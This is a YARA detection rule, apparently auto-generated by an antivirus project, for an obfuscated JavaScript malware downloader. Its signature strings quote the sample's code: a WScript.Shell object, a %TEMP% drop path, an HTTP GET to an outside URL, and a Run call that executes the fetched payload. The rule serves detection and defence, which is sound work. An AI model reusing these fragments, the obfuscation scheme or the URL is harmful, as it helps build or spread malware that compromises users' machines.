rule sig_20160427_ef692e7503fa971885a73b5f917e0036 {
  meta:
    description = "datamaliciousorder - file 20160427_ef692e7503fa971885a73b5f917e0036.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "932c140aacf3db55c3c8615f4f5c0b88dd416e26a80be008ab662922689a3ed4"

  strings:
    $s1  = "function GuoawIfzxh() {return MsvpuXadtg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"DIdIJwm" ascii
    $s2  = "function GuoawIfzxh() {return MsvpuXadtg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"DIdIJwm" ascii
    $s3  = "var MsvpuXadtg = function GuisfOvhfn() {return UkhfaOladj[CbeqyHruft](\"WScript\"+\".Shell\");}(), OvoqpKunxv = 11;" fullword ascii
    $s4  = "function EyeduZglix() {return ((WkqmfHsein == true) && (WkqmfHsein == UjaqjSnmdr)) ? 1 : XzyxpFxbev;};" fullword ascii
    $s5  = "function YehezQlzrd(AccizKabaw, UfvmqYyubj){XzyxpFxbev = XzyxpFxbev * 1; return AccizKabaw - UfvmqYyubj;};" fullword ascii
    $s6  = "StiwcPfhvg[CjjmkCrpky](\"G\" + \"ET\", \"http://adamauto.nl/gdh46ss\", false);" fullword ascii
    $s7  = "var UkhfaOladj = this[\"WScript\"];" fullword ascii
    $s8  = "function CgcyjXoxdh(){return VgbgeBcnqm + \"\";};" fullword ascii
    $s9  = "if (StiwcPfhvg[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function BavtcHbvyw(){return 23;};" fullword ascii
    $s11 = "function KygwsUzmlf(HmwdjMvunj){MsvpuXadtg[\"R\"+\"un\"](HmwdjMvunj, XzyxpFxbev, XzyxpFxbev);};" fullword ascii
    $s12 = "MdsbiCvgjg = true;" fullword ascii
    $s13 = "UjaqjSnmdr = true; " fullword ascii
    $s14 = "WkqmfHsein = true; " fullword ascii
    $s15 = "function LlfugQrikk(){return CbeqyHruft;};" fullword ascii
    $s16 = "var WkqmfHsein = false;" fullword ascii
    $s17 = "var MdsbiCvgjg = false;" fullword ascii
    $s18 = "function VhvytUocww()" fullword ascii
    $s19 = "}while (ZmkanZgdya);" fullword ascii
    $s20 = "return YehezQlzrd(GocusPvgsy, YurdwLcsje);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}